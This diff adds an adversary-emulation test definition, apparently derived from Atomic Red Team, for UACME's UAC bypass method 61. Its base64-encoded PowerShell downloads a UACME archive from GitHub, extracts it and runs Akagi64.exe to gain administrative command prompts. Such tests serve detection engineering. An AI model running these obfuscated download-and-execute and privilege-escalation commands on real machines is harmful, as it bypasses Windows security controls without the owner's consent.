@@ -1,0 +1,19 @@
+- id: fb98431a-ec0f-57e3-b702-dd9c73d82e33
+  name: Soumaia ART Tests - UACME Bypass Method 61
+  description: "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Enigma0x3/bytecode77 derivative by Nassim Asrir\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\slui.exe, \\system32\\changepk.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodDebugObject\n\nhttps://github.com/hfiref0x/UACME"
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1548.002
+    name: 'Abuse Elevation Control Mechanism: Bypass User Account Control'
+  platforms:
+    windows:
+      cmd:
+        command: |-
+          powershell -NoProfile -EncodedCommand JAB0AGUAbQBwAFAAYQB0AGgAIAA9ACAAYwBtAGQAIAAvAGMAIABlAGMAaABvACAAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXAB1AGEAYwBtAGUAXAA2ADEAIABBAGsAYQBnAGkANgA0AC4AZQB4AGUACgBpAGYAIAAoAFQAZQBzAHQALQBQAGEAdABoACAAIgAkAHQAZQBtAHAAUABhAHQAaAAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA
+          if not "%ERRORLEVEL%"=="0" (
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAQQBSAFQALQBFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzACIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAEkAZwBuAG8AcgBlACAALQBGAG8AcgBjAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAHIAZQBkAGMAYQBuAGEAcgB5AGMAbwAvAGEAdABvAG0AaQBjAC0AcgBlAGQALQB0AGUAYQBtAC8AcgBhAHcALwBtAGEAcwB0AGUAcgAvAGEAdABvAG0AaQBjAHMALwBUADEANQA0ADgALgAwADAAMgAvAGIAaQBuAC8AdQBhAGMAbQBlAC4AegBpAHAAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXAB1AGEAYwBtAGUALgB6AGkAcAAiAAoARQB4AHAAYQBuAGQALQBBAHIAYwBoAGkAdgBlACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAEEAUgBUAC0ARQB4AHQAZQByAG4AYQBsAFAAYQB5AGwAbwBhAGQAcwBcAHUAYQBjAG0AZQAuAHoAaQBwACIAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAQQBSAFQALQBFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzAFwAdQBhAGMAbQBlACIAIAAtAEYAbwByAGMAZQAKAFIAZQBtAG8AdgBlAC0ASQB0AGUAbQAgACIAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXAB1AGEAYwBtAGUALgB6AGkAcAAiACAALQBGAG8AcgBjAGUACgA=
+          )
+          "%TEMP%\ART-ExternalPayloads\uacme\61 Akagi64.exe"
+        cleanup: |-
+          powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
+          powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
